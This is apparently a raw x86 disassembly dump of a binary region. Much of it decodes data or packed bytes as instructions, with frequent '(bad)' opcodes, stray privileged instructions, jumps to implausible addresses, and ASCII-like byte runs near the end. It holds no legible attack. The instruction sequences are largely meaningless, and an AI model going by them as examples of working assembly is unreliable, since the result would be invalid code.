  42a29e:	dec    ebp
  42a29f:	dec    DWORD PTR [ecx+0x4dc7e045]
  42a2a5:	fmul   DWORD PTR [ecx+0x4df8f085]
  42a2ab:	inc    ebp
  42a2ac:	mov    DWORD PTR [ebx],esi
  42a2ae:	fadd   QWORD PTR [ebx]
  42a2b0:	dec    ebp
  42a2b1:	push   eax
  42a2b2:	xor    eax,DWORD PTR [ebp+0x3]
  42a2b5:	push   eax
  42a2b6:	mov    DWORD PTR [eax],ebx
  42a2b8:	fdivr  st,st(7)
  42a2ba:	test   BYTE PTR [ebx-0x3fc21000],0x85
  42a2c1:	dec    esi
  42a2c2:	clc    
  42a2c3:	inc    ebp
  42a2c4:	test   BYTE PTR [ebx],dh
  42a2c6:	add    DWORD PTR [ebx],eax
  42a2c8:	add    BYTE PTR [eax+0x4d],dl
  42a2cb:	jne    0x42a300
  42a2cd:	lea    ecx,[ebx-0x7617fc44]
  42a2d3:	div    ah
  42a2d5:	inc    DWORD PTR [ebp+0x45]
  42a2d8:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  42a2de:	jb     0x42a26b
  42a2e0:	add    BYTE PTR [eax*2-0x17ba743f],cl
  42a2e7:	mov    ecx,DWORD PTR [ebp-0x10]
  42a2ea:	xor    ecx,DWORD PTR [ebp+0x3]
  42a2ed:	mov    edi,DWORD PTR [ebx]
  42a2ef:	adc    BYTE PTR [ebp+0x41],dh
  42a2f2:	mov    ecx,DWORD PTR [ebx-0x37382704]
  42a2f8:	ret    
  42a2f9:	push   ss
  42a2fa:	push   0x45
  42a2fc:	lea    ecx,[ebx+0x4de80cb0]
  42a302:	sti    
  42a303:	add    edi,edi
  42a305:	or     BYTE PTR [ebp+0x4d],al
  42a308:	mov    ebp,DWORD PTR [ebx]
  42a30a:	xor    ebp,ecx
  42a30c:	mov    al,BYTE PTR [edx]
  42a30e:	add    eax,0xc7200
  42a313:	jne    0x42a362
  42a315:	lea    esi,[ebx]
  42a317:	mov    al,0xf
  42a319:	call   0xe99de
  42a31e:	sar    DWORD PTR [eax],0x84
  42a321:	pushf  
  42a322:	add    DWORD PTR [ecx+0x4545d000],ecx
  42a328:	mov    edi,DWORD PTR [ecx]
  42a32a:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  42a331:	test   DWORD PTR [eax],eax
  42a333:	clc    
  42a334:	dec    ebp
  42a335:	inc    ebp
  42a336:	xor    edi,DWORD PTR [ebx]
  42a338:	setl   al
  42a33b:	(bad)  
  42a33c:	retf   
  42a33d:	rol    cl,1
  42a33f:	dec    ebp
  42a340:	test   BYTE PTR [ebp+0x4d00cc01],cl
  42a346:	inc    ebp
  42a347:	lea    ecx,[ebx-0x75b2cc38]
  42a34d:	lea    eax,ds:0x4d72c4
  42a353:	mov    ecx,DWORD PTR [ebp-0x4]
  42a356:	xor    ecx,edi
  42a358:	bswap  ebx
  42a35a:	ror    BYTE PTR [ebp-0x35],0xe9
  42a35e:	rol    DWORD PTR [ecx],0x84
  42a361:	add    BYTE PTR [ecx],al
  42a363:	cmp    al,BYTE PTR [eax]
  42a365:	pushf  
  42a366:	inc    ebp
  42a367:	jnp    0x8a42d76a
  42a36d:	mov    eax,DWORD PTR ds:0xcf72e8
  42a373:	lock dec ebp
  42a375:	retf   
  42a376:	xor    ecx,DWORD PTR [ebp+0xf]
  42a379:	mov    eax,eax
  42a37b:	fmul   st,st(3)
  42a37d:	test   ecx,0x1988484
  42a383:	xor    al,BYTE PTR [eax]
  42a385:	mov    DWORD PTR [ebp-0x28],eax
  42a388:	mov    eax,DWORD PTR [ebp+0x33]
  42a38b:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  42a391:	ret    
  42a392:	add    al,cl
  42a394:	dec    ebp
  42a395:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  42a39b:	add    ecx,DWORD PTR ds:0xc7250
  42a3a1:	inc    ebp
  42a3a2:	rcl    DWORD PTR [eax+0x4d],0x27
  42a3a6:	mov    edi,edi
  42a3a8:	xor    ecx,DWORD PTR [ebx+0xde48a]
  42a3ae:	jb     0x42a377
  42a3b0:	add    BYTE PTR [ecx+eax*8-0x74cdb2b8],al
  42a3b7:	mov    esi,DWORD PTR [ebx]
  42a3b9:	cld    
  42a3ba:	mov    cl,bh
  42a3bc:	or     eax,0x372b6
  42a3c1:	cmp    ecx,eax
  42a3c3:	jne    0x42a440
  42a3c9:	mov    eax,DWORD PTR [ebp-0x20]
  42a3cc:	mov    eax,DWORD PTR [eax]
  42a3ce:	xor    eax,edi
  42a3d0:	mov    al,BYTE PTR [ebp+eax*1+0x327248]
  42a3d7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3da:	mov    ecx,edi
  42a3dc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a3e2:	jb     0x42a3f3
  42a3e4:	add    BYTE PTR [edi-0x3f],dl
  42a3e7:	add    BYTE PTR [ebp-0x75],cl
  42a3ea:	mov    esi,eax
  42a3ec:	xor    eax,DWORD PTR [eax]
  42a3ee:	mov    al,bh
  42a3f0:	or     eax,0x487284
  42a3f5:	xor    al,cl
  42a3f7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3fa:	mov    ecx,edi
  42a3fc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a402:	jb     0x42a413
  42a404:	add    BYTE PTR [edi],dh
  42a406:	enter  0x8500,0x8b
  42a40a:	add    ah,bl
  42a40c:	add    BYTE PTR [eax],al
  42a40e:	inc    ebp
  42a40f:	(bad)  
  42a410:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a48]
  42a417:	mov    esi,DWORD PTR [edx-0x4]
  42a41a:	add    bh,cl
  42a41c:	dec    ebp
  42a41d:	mov    dh,0x8b
  42a41f:	add    esi,DWORD PTR [ebx]
  42a421:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  42a427:	add    BYTE PTR [eax],al
  42a429:	mov    eax,ecx
  42a42b:	loopne 0x42a47a
  42a42d:	add    BYTE PTR [ebx-0x757bcc39],cl
  42a433:	dec    eax
  42a434:	or     eax,0x8b7232
  42a439:	in     al,0xc1
  42a43b:	or     DWORD PTR [ebp-0x31],ecx
  42a43e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a48]
  42a445:	xor    dh,BYTE PTR [edx-0x75]
  42a448:	add    al,dh
  42a44a:	enter  0x4f09,0xcf
  42a44e:	inc    ebp
  42a44f:	mov    WORD PTR [ebx-0x75cdccb8],cs
  42a455:	or     al,BYTE PTR ds:0xe4728b
  42a45b:	or     DWORD PTR [ebp-0x31],ecx
  42a45e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4c]
  42a465:	cmp    dh,BYTE PTR [edx+0xf]
  42a468:	add    bl,dl
  42a46a:	rol    DWORD PTR [eax],0x4d
  42a46d:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  42a473:	(bad)  
  42a474:	or     eax,0x487284
  42a479:	xor    al,cl
  42a47b:	mov    ecx,DWORD PTR [ebp-0x20]
  42a47e:	mov    ecx,DWORD PTR [ecx]
  42a480:	xor    ecx,edi
  42a482:	mov    cl,BYTE PTR [ebp+ecx*1+0x327248]
  42a489:	xor    cl,al
  42a48b:	mov    ecx,DWORD PTR [edi]
  42a48d:	fadd   QWORD PTR [ebp+0x9]
  42a490:	call   0xffcf9f64
  42a495:	dec    eax
  42a496:	dec    ebp
  42a497:	xor    bh,BYTE PTR [ebx]
  42a499:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  42a49d:	loopne 0x42a49b
  42a49f:	or     edi,eax
  42a4a1:	iret   
  42a4a2:	ret    
  42a4a3:	mov    WORD PTR [ebp+0x4c],es
  42a4a6:	mov    esi,DWORD PTR [edx]
  42a4a8:	call   0x84526be7
  42a4ad:	(bad)  
  42a4ae:	cwde   
  42a4af:	add    BYTE PTR [edx],dh
  42a4b1:	mov    esi,DWORD PTR [ebx]
  42a4b3:	fmul   QWORD PTR [ebx+0x55c7fc00]
  42a4b9:	test   BYTE PTR [ebx],dh
  42a4bb:	dec    eax
  42a4bc:	add    esi,DWORD PTR [edx]
  42a4be:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  42a4c4:	dec    edi
  42a4c6:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d48]
  42a4cd:	xor    al,BYTE PTR [ebx]
  42a4cf:	mov    edi,DWORD PTR [ebx]
  42a4d1:	in     al,0x75
  42a4d3:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  42a4d9:	dec    eax
  42a4da:	xor    esi,DWORD PTR [edx]
  42a4dc:	lea    ecx,[edx]
  42a4de:	or     BYTE PTR [ebx+0x900f072],cl
  42a4e4:	ja     0x42a4b5
  42a4e6:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b4],cl
  42a4ed:	cmp    ch,al
  42a4ef:	jne    0x42a4e4
  42a4f1:	mov    edi,edi
  42a4f3:	fadd   QWORD PTR [ebp+0x0]
  42a4f6:	mov    eax,edi
  42a4f8:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb8]
  42a4ff:	mov    edx,DWORD PTR [ebx]
  42a501:	in     al,0x45
  42a503:	or     DWORD PTR [ebx],esi
  42a505:	iret   
  42a506:	add    ecx,DWORD PTR [eax+edx*2+0x45321848]
  42a50d:	xor    dl,BYTE PTR [eax-0x75]
  42a510:	sbb    al,ah
  42a512:	dec    DWORD PTR [ecx]
  42a514:	mov    ecx,edi
  42a516:	in     al,dx
  42a517:	mov    eax,es
  42a519:	dec    eax
  42a51a:	mov    DWORD PTR [edx],esi
  42a51c:	fmul   QWORD PTR [edx]
  42a51e:	jne    0x42a4ab
  42a520:	(bad)  
  42a521:	(bad)  
  42a523:	or     DWORD PTR [ebp-0x31],eax
  42a526:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b4]
  42a52d:	cmp    bh,bh
  42a52f:	jne    0x42a576
  42a531:	lea    ecx,[ebx-0x38372750]
  42a537:	inc    ebx
  42a539:	mov    eax,ecx
  42a53b:	mov    eax,0xa00c111
  42a540:	jne    0x42a587
  42a542:	mov    esi,DWORD PTR [ebx]
  42a544:	test   al,0x3
  42a546:	inc    ebp
  42a547:	mov    DWORD PTR [eax-0xc],edx
  42a54a:	fiadd  WORD PTR [ebp-0x1]
  42a54d:	xor    ecx,DWORD PTR [ebx+0x4d30108d]
  42a553:	jb     0x42a556
  42a555:	add    BYTE PTR [ebx+0x454dacc7],cl
  42a55b:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  42a561:	retf   
  42a562:	mov    edx,ecx
  42a564:	adc    al,0x84
  42a566:	(bad)  
  42a567:	std    
  42a568:	ret    
  42a569:	jmp    FWORD PTR [edi-0x2b7474bb]
  42a56f:	hlt    
  42a570:	rol    edi,0x82
  42a573:	ret    
  42a574:	cld    
  42a575:	enter  0x11ff,0x45
  42a579:	inc    ebp
  42a57a:	pop    edi
  42a57b:	mov    ebx,DWORD PTR [ebx+0x14]
  42a57e:	ret    0xc7
  42a581:	test   BYTE PTR [ebx+0x45325198],cl
  42a587:	jmp    0x42a514
  42a589:	push   0x8
  42a58b:	call   DWORD PTR [esi]
  42a58d:	in     al,dx
  42a58e:	add    BYTE PTR [ebp+0x1],0x50
  42a592:	add    bl,ah
  42a594:	add    bh,bh
  42a596:	icebp  
  42a597:	mov    ecx,DWORD PTR [eax]
  42a599:	cld    
  42a59a:	pop    es
  42a59b:	dec    ebp
  42a59c:	shl    DWORD PTR [ebx],0x72
  42a59f:	add    eax,DWORD PTR [eax]
  42a5a1:	cmp    edx,ecx
  42a5a3:	je     0x42a5b5
  42a5a5:	mov    esi,DWORD PTR [ebp-0x4]
  42a5a8:	inc    edi
  42a5aa:	or     al,0xc3
  42a5ac:	jmp    FWORD PTR [edx-0x18]
  42a5af:	(bad)  
  42a5b0:	sti    
  42a5b1:	cwde   
  42a5b2:	(bad)  
  42a5b3:	call   0xffa09ebe
  42a5b8:	or     al,0x45
  42a5ba:	push   ebp
  42a5bb:	sub    esp,0x18
  42a5be:	push   ebx
  42a5bf:	inc    ebp
  42a5c0:	mov    edi,edi
  42a5c2:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  42a5c9:	test   al,0x50
  42a5cb:	inc    ebp
  42a5cc:	push   ecx
  42a5cd:	push   eax
  42a5ce:	xor    esp,DWORD PTR [edi-0x748d0041]
  42a5d4:	add    ah,bh
  42a5d6:	(bad)  
  42a5d7:	dec    ebp
  42a5d8:	add    DWORD PTR [ebx],esi
  42a5da:	inc    ebp
  42a5db:	add    ecx,DWORD PTR [ebx+0x74943b]
  42a5e1:	push   0xffffff8b
  42a5e3:	dec    DWORD PTR [ebx-0x7fbaeb54]
  42a5e9:	add    eax,DWORD PTR [ecx]
  42a5eb:	or     BYTE PTR [eax],al
  42a5ed:	call   0xff849df2
  42a5f2:	mov    eax,DWORD PTR [ebp+0x14]
  42a5f5:	mov    ecx,DWORD PTR [ecx+0x801ac]
  42a5fb:	inc    ebp
  42a5fc:	dec    ecx
  42a5fd:	add    ebp,DWORD PTR [edx+0x14]
  42a600:	push   0x8b3045
  42a605:	call   0x33acf37a
  42a60a:	inc    DWORD PTR [ebx]
  42a60c:	mov    DWORD PTR [edi],ecx
  42a60e:	mov    eax,ecx
  42a610:	or     BYTE PTR [ebp-0x3d],cl
  42a613:	cmp    eax,edi
  42a615:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  42a61a:	adc    BYTE PTR [ebx+0x5eff0845],cl
  42a620:	adc    al,0xc9
  42a622:	inc    ebp
  42a623:	adc    BYTE PTR [eax+0x55],dl
  42a626:	jne    0x42a614
  42a628:	call   0xff53a5b8
  42a62d:	dec    ebp
  42a62e:	inc    ebp
  42a62f:	mov    ecx,DWORD PTR [ebx+0x390338b]
  42a635:	add    BYTE PTR [ebx],bh
  42a637:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  42a63b:	push   eax
  42a63c:	or     al,0x51
  42a63e:	dec    ebp
  42a63f:	xor    DWORD PTR [ebx],0xf320398
  42a645:	cmp    eax,DWORD PTR [ebp+0x74]
  42a648:	mov    edi,edi
  42a64a:	pop    edi
  42a64b:	adc    BYTE PTR [ebx+0x75],bl
  42a64e:	ret    0x50
  42a651:	mov    edx,DWORD PTR ss:[edi-0x7d]
  42a655:	(bad)  
  42a656:	clc    
  42a657:	mov    esp,ebp
  42a659:	pop    ecx
  42a65a:	mov    ecx,0xf80085c2
  42a65f:	mov    ecx,DWORD PTR [ecx+edx*2]
  42a662:	push   esi
  42a663:	push   esi
  42a664:	(bad)  
  42a665:	lock add DWORD PTR [ebp+0x44],eax
  42a669:	mov    edx,DWORD PTR [eax]
  42a66b:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  42a66f:	or     BYTE PTR [eax+0x7],dl
  42a672:	push   ecx
  42a673:	ret    
  42a674:	xor    ebx,DWORD PTR [eax+0x37232be]
  42a67a:	add    BYTE PTR [ecx+0x147c8bfe],cl
  42a680:	or     al,0x80
  42a682:	jge    0x42a685
  42a684:	mov    DWORD PTR [eax],eax
  42a686:	and    al,0x8
  42a688:	cmp    DWORD PTR [ebp+0x10],eax
  42a68b:	mov    edx,DWORD PTR [esi]
  42a68d:	xchg   esp,eax
  42a68e:	dec    esp
  42a68f:	add    BYTE PTR [eax],dl
  42a691:	mov    ecx,edx
  42a693:	add    edx,DWORD PTR [esp+edi*1+0x8]
  42a697:	dec    ebp
  42a698:	into   
  42a699:	mov    ebp,DWORD PTR [edi+0x240089d8]
  42a69f:	mov    edx,DWORD PTR [eax+0x14]
  42a6a2:	das    
  42a6a3:	add    al,0x45
  42a6a5:	add    BYTE PTR [ebp+0x0],dh
  42a6a8:	mov    edi,edi
  42a6aa:	and    al,0x50
  42a6ac:	mov    eax,DWORD PTR [eax]
  42a6ae:	and    al,0xd1
  42a6b0:	xor    eax,DWORD PTR [esi]
  42a6b2:	lea    eax,[ebp+0x8]
  42a6b5:	xor    esi,DWORD PTR [edx+0x3]
  42a6b8:	add    BYTE PTR [ecx+0x4510fc44],cl
  42a6be:	cmp    cl,BYTE PTR [ebx+0x75eb0c9c]
  42a6c4:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  42a6ce:	cmp    edi,edi
  42a6d0:	pushf  
  42a6d1:	mov    edi,edi
  42a6d3:	or     BYTE PTR [esi+ecx*1],cl
  42a6d6:	jne    0x42a69b
  42a6d8:	call   0xba6a4
  42a6dd:	adc    BYTE PTR [ebp+eax*2+0xc],al
  42a6e1:	mov    ebx,DWORD PTR [eax]
  42a6e3:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  42a6e7:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  42a6ef:	pop    esi
  42a6f0:	dec    ecx
  42a6f2:	and    al,0x10
  42a6f4:	call   DWORD PTR [ebp+0x24]
  42a6f7:	in     al,dx
  42a6f8:	call   0xffc6a5e1
  42a6fd:	adc    BYTE PTR [eax+edi*1+0xc],al
  42a701:	pushf  
  42a702:	pop    esi
  42a703:	mov    ebp,esp
  42a705:	and    al,0xc2
  42a707:	push   edi
  42a708:	add    BYTE PTR [ecx+0x3a],al
  42a70b:	mov    DWORD PTR [ebp+0x24],esi
  42a70e:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  42a714:	dec    DWORD PTR [eax]
  42a716:	and    al,0x7
  42a718:	(bad)  
  42a719:	cli    
  42a71a:	and    al,0x98
  42a71c:	or     BYTE PTR [edx],dh
  42a71e:	sbb    BYTE PTR [ebx],al
  42a720:	adc    al,0x89
  42a722:	jmp    DWORD PTR [esp]
  42a725:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  42a72b:	adc    al,0x8
  42a72d:	dec    ebp
  42a72e:	adc    BYTE PTR [ebp-0x7c],dh
  42a731:	mov    esi,DWORD PTR [edx]
  42a733:	and    al,0x24
  42a735:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  42a73b:	add    edi,eax
  42a73d:	pcmpeqb mm1,mm2
  42a740:	jmp    0x42a78e
  42a742:	dec    DWORD PTR [eax]
  42a744:	je     0x42a731
  42a746:	mov    edi,DWORD PTR [ecx]
  42a748:	pop    ebp
  42a749:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  42a74d:	cwde   
  42a74e:	mov    DWORD PTR [eax-0x8],ebp
  42a751:	jge    0x42a7bb
  42a753:	dec    DWORD PTR [ecx+0x5fbf7424]
  42a759:	jl     0x42a7a5
  42a75b:	adc    BYTE PTR [eax],al
  42a75d:	pop    esp
  42a75e:	cmp    al,0x10
  42a760:	add    BYTE PTR [ecx+0x41],dl
  42a763:	adc    BYTE PTR [eax],al
  42a765:	test   al,0x21
  42a767:	adc    BYTE PTR [eax],al
  42a769:	cs jbe 0x42a77c
  42a76c:	add    BYTE PTR [edx+0xe],ch
  42a76f:	adc    BYTE PTR [eax],al
  42a771:	clc    
  42a772:	pusha  
  42a773:	adc    BYTE PTR [eax],al
  42a775:	jp     0x42a7b8
  42a777:	adc    BYTE PTR [eax],al
  42a779:	mov    ds:0x88001059,eax
  42a77e:	pop    ebp
  42a77f:	adc    BYTE PTR [eax],al
  42a781:	inc    ax
  42a783:	adc    BYTE PTR [eax],al
  42a785:	pop    ecx
  42a786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a787:	inc    edx
  42a788:	add    BYTE PTR [ebp-0x59],bl
  42a78b:	inc    edx
  42a78c:	add    BYTE PTR [ecx-0x59],ah
  42a78f:	inc    edx
  42a790:	add    BYTE PTR [ebp-0x59],ah
  42a793:	inc    edx
  42a794:	add    BYTE PTR [ecx-0x59],ch
  42a797:	inc    edx
  42a798:	add    BYTE PTR [ebp-0x59],ch
  42a79b:	inc    edx
  42a79c:	add    BYTE PTR [ecx-0x59],dh
  42a79f:	inc    edx
  42a7a0:	add    BYTE PTR [ebp-0x59],dh
  42a7a3:	inc    edx
  42a7a4:	add    BYTE PTR [ecx-0x59],bh
  42a7a7:	inc    edx
  42a7a8:	add    BYTE PTR [ebp-0x59],bh
  42a7ab:	inc    edx
  42a7ac:	add    BYTE PTR [ecx-0x2effbd59],al
  42a7b2:	cmp    BYTE PTR [eax],dl
  42a7b4:	add    BYTE PTR [edi],dl
  42a7b6:	xor    BYTE PTR [eax],dl
  42a7b8:	add    BYTE PTR [eax],al
  42a7ba:	pop    ds
  42a7bb:	adc    BYTE PTR [eax],al
  42a7bd:	(bad)  
  42a7be:	adc    BYTE PTR ds:[eax],al
  42a7c1:	in     eax,0x19
  42a7c3:	adc    BYTE PTR [eax],al
  42a7c5:	bound  ebx,QWORD PTR [ecx]
  42a7c7:	adc    BYTE PTR [eax],al
  42a7c9:	shl    BYTE PTR [edi+0x10],1
  42a7cc:	add    BYTE PTR [edi-0x4effefa9],al
  42a7d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7d3:	inc    edx
  42a7d4:	add    BYTE PTR [ebp-0x46ffbd59],dh
  42a7da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7db:	inc    edx
  42a7dc:	add    BYTE PTR [ebp-0x3effbd59],bh
  42a7e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7e3:	inc    edx
  42a7e4:	add    ch,al
  42a7e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7e7:	inc    edx
  42a7e8:	add    cl,cl
  42a7ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7eb:	inc    edx
  42a7ec:	add    ch,cl
  42a7ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7ef:	inc    edx
  42a7f0:	add    dl,ah
  42a7f2:	adc    BYTE PTR ds:[eax],al
  42a7f5:	ds pop ebp
  42a7f7:	adc    BYTE PTR [eax],al
  42a7f9:	add    BYTE PTR [esi+0x10],ah
  42a7fc:	add    al,ch
  42a7fe:	pop    eax
  42a7ff:	adc    BYTE PTR [eax],al
  42a801:	cdq    
  42a802:	outs   dx,BYTE PTR ds:[esi]
  42a803:	adc    BYTE PTR [eax],al
  42a805:	ja     0x42a867
  42a807:	adc    BYTE PTR [eax],al
  42a809:	jne    0x42a842
  42a80b:	adc    BYTE PTR [eax],al
  42a80d:	arpl   WORD PTR [eax+edx*1],bx
  42a810:	add    cl,dh
  42a812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a813:	inc    edx
  42a814:	add    ch,dh
  42a816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a817:	inc    edx
  42a818:	add    cl,bh
  42a81a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81b:	inc    edx
  42a81c:	add    ch,bh
  42a81e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81f:	inc    edx
  42a820:	add    BYTE PTR [ecx],al
  42a822:	test   al,0x42
  42a824:	add    BYTE PTR ds:0x90042a8,al
  42a82a:	test   al,0x42
  42a82c:	add    BYTE PTR ds:0x5c0042a8,cl
  42a832:	adc    DWORD PTR [eax],edx
  42a834:	add    BYTE PTR [ebp+edx*2+0x9fe0010],bl
  42a83b:	adc    BYTE PTR [eax],al
  42a83d:	and    al,0x30
  42a83f:	adc    BYTE PTR [eax],al
  42a841:	ret    
  42a842:	pop    edi
  42a843:	adc    BYTE PTR [eax],al
  42a845:	loopne 0x42a8ad
  42a847:	adc    BYTE PTR [eax],al
  42a849:	add    eax,0xd400105b
  42a84e:	aas    
  42a84f:	adc    BYTE PTR [eax],al
  42a851:	xor    DWORD PTR [eax-0x57caffbe],ebp
  42a857:	inc    edx
  42a858:	add    BYTE PTR [ecx],bh
  42a85a:	test   al,0x42
  42a85c:	add    BYTE PTR ds:0x410042a8,bh
  42a862:	test   al,0x42
  42a864:	add    BYTE PTR [ebp-0x58],al
  42a867:	inc    edx
  42a868:	add    BYTE PTR [ecx-0x58],cl
  42a86b:	inc    edx
  42a86c:	add    BYTE PTR [ebp-0x58],cl
  42a86f:	inc    edx
  42a870:	add    dh,dl
  42a872:	sbb    eax,0x10f00010
  42a877:	adc    BYTE PTR [eax],al
  42a879:	inc    ecx
  42a87a:	bound  edx,QWORD PTR [eax]
  42a87c:	add    BYTE PTR [ebx+eax*1],ah
  42a87f:	adc    BYTE PTR [eax],al
  42a881:	jecxz  0x42a8e6
  42a883:	adc    BYTE PTR [eax],al
  42a885:	pushf  
  42a886:	xor    DWORD PTR [eax],edx
  42a888:	add    BYTE PTR [ecx],al
  42a88a:	or     dl,BYTE PTR [eax]
  42a88c:	add    dh,dl
  42a88e:	inc    edi
  42a88f:	adc    BYTE PTR [eax],al
  42a891:	jno    0x42a83b
  42a893:	inc    edx
  42a894:	add    BYTE PTR [ebp-0x58],dh
  42a897:	inc    edx
  42a898:	add    BYTE PTR [ecx-0x58],bh
  42a89b:	inc    edx
  42a89c:	add    BYTE PTR [ebp-0x58],bh
  42a89f:	inc    edx
  42a8a0:	add    BYTE PTR [ecx-0x7affbd58],al
  42a8a6:	test   al,0x42
  42a8a8:	add    BYTE PTR [ecx-0x72ffbd58],cl
  42a8ae:	test   al,0x42
  42a8b0:	add    BYTE PTR [ebx+0x32],al
  42a8b3:	xor    dh,BYTE PTR ds:0x5a52345f
  42a8b9:	push   esp
  42a8ba:	xor    BYTE PTR [esi],dh
  42a8bc:	add    BYTE PTR [ecx+0x36],cl
  42a8bf:	push   eax
  42a8c0:	pop    edi
  42a8c1:	ss inc ebx
  42a8c3:	ss pop edx
  42a8c5:	xor    ebx,DWORD PTR [edi+0x52]
  42a8c8:	add    BYTE PTR [edi+ecx*2+0x32],dl
  42a8cc:	pop    edi
  42a8cd:	dec    esi
  42a8ce:	dec    esp
  42a8cf:	dec    eax
  42a8d0:	xor    esi,DWORD PTR [edx]
  42a8d2:	pop    edi
  42a8d3:	xor    al,0x4b
  42a8d5:	add    BYTE PTR [eax+0x49],cl
  42a8d8:	push   ebp
  42a8d9:	xor    al,0x5f
  42a8db:	dec    esp
  42a8dc:	inc    edx
  42a8dd:	dec    ecx
  42a8de:	cmp    DWORD PTR [edi+ebx*2],esi
  42a8e1:	pop    ecx
  42a8e2:	inc    edi
  42a8e3:	add    BYTE PTR [eax+0x50],bl
  42a8e6:	dec    eax
  42a8e7:	pop    edi
  42a8e8:	push   ebp
  42a8e9:	push   ecx
  42a8ea:	inc    edi
  42a8eb:	xor    cl,BYTE PTR [edx+0x38]
  42a8ee:	push   esi
  42a8ef:	add    BYTE PTR [ebx+0x4a],al
  42a8f2:	push   edx
  42a8f3:	pop    edi
  42a8f4:	dec    edi
  42a8f5:	dec    eax
  42a8f6:	dec    edi
  42a8f7:	dec    edi
  42a8f8:	dec    edx
  42a8f9:	add    BYTE PTR [ecx+0x52],al
  42a8fc:	cmp    DWORD PTR [edi+0x56],ebx
  42a8ff:	aaa    
  42a900:	dec    esp
  42a901:	cmp    DWORD PTR [ebx+0x5f],eax
  42a904:	push   edx
  42a905:	inc    esp
  42a906:	add    BYTE PTR [ecx+0x37],bl
  42a909:	inc    esp
  42a90a:	pop    edi
  42a90b:	dec    ecx
  42a90c:	xor    esi,DWORD PTR [edi]
  42a90e:	xor    DWORD PTR [edi+0x49],ebx
  42a911:	push   esp
  42a912:	xor    eax,DWORD PTR [eax]
  42a914:	push   edx
  42a915:	xor    BYTE PTR [eax+0x5f],bl
  42a918:	dec    eax
  42a919:	push   edi
  42a91a:	inc    esi
  42a91b:	xor    DWORD PTR [edi+0x5f],edx
  42a91e:	cmp    BYTE PTR [ebx+0x37],dl
  42a921:	add    BYTE PTR [esi+0x42],dl
  42a924:	dec    ecx
  42a925:	xor    ebx,DWORD PTR [edi+0x45]
  42a928:	xor    BYTE PTR [ebp+0x5f],cl
  42a92b:	xor    al,0x34
  42a92d:	xor    BYTE PTR [edx+0x5f],cl
  42a930:	inc    edi
  42a931:	add    BYTE PTR [edx+0x57],dl
  42a934:	xor    ebx,DWORD PTR [edi+0x31]
  42a937:	dec    edx
  42a938:	push   edi
  42a939:	xor    eax,0x4d435f
  42a93e:	dec    ecx
  42a93f:	xor    eax,0x36365f39
  42a944:	dec    eax
  42a945:	xor    BYTE PTR [eax],al
  42a947:	dec    edi
  42a948:	inc    ebx
  42a949:	push   edi
  42a94a:	pop    edi
  42a94b:	inc    edi
  42a94c:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  42a951:	add    BYTE PTR [edx+0x58],al
  42a954:	inc    edi
  42a955:	ss pop edi
  42a957:	push   esi
  42a958:	inc    ebx
  42a959:	dec    esi
  42a95a:	inc    esp
  42a95b:	add    BYTE PTR [edi+0x4d],cl
  42a95e:	inc    edi
  42a95f:	xor    ebx,DWORD PTR [edi+0x34]
  42a962:	dec    esi
  42a963:	pop    edx
  42a964:	cmp    BYTE PTR [edi+0x58],bl
  42a967:	cmp    BYTE PTR [eax],al
  42a969:	push   edx
  42a96a:	pop    eax
  42a96b:	push   ecx
  42a96c:	pop    edi
  42a96d:	dec    esp
  42a96e:	push   edx
  42a96f:	dec    ecx
  42a970:	dec    edi
  42a971:	inc    esp
  42a972:	pop    edi
  42a973:	dec    edi
  42a974:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  42a978:	push   eax
  42a979:	inc    ebp
  42a97a:	pop    edi
  42a97b:	xor    eax,0x565f3945
  42a980:	add    BYTE PTR [edi+0x4e],al
  42a983:	push   esi
  42a984:	pop    edi
  42a985:	inc    edi
  42a986:	push   esp
  42a987:	dec    eax
  42a988:	xor    dh,BYTE PTR [ecx]
  42a98a:	pop    edi
  42a98b:	dec    edi
  42a98c:	xor    eax,DWORD PTR ss:[eax]
  42a98f:	inc    esp
  42a990:	inc    ebp
  42a991:	dec    ecx
